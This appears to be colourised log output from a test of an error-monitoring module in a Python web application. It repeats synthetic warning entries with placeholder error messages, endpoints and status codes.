WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.786114Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1858'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m458[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.786176Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1859'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m459[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.786286Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1860'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m460[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.786359Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1861'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m461[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.786414Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1862'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m462[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.786468Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1863'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m463[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.786524Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1864'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m464[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.786577Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1865'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m465[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.786629Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1866'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m466[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.786682Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1867'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m467[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.786735Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1868'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m468[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.786784Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1869'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m469[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.786835Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1870'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m470[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.786888Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1871'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m471[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.786939Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1872'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m472[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.786989Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1873'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m473[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.787039Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1874'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m474[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.787088Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1875'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m475[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.787136Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1876'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m476[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.787184Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1877'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m477[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.787231Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1878'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m478[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.787279Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1879'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m479[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.787338Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1880'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m480[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.787386Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1881'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m481[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.787434Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1882'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m482[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.787481Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1883'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m483[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.787528Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1884'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m484[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.787577Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1885'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m485[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.787624Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1886'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m486[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.787671Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1887'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m487[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.787744Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1888'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m488[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.787831Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1889'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m489[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.787935Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1890'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m490[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.788033Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1891'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m491[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.788118Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1892'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m492[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.788179Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1893'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m493[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.788231Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1894'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m494[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.788282Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1895'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m495[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.788332Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1896'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m496[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.788383Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m38[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1897'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m497[0m
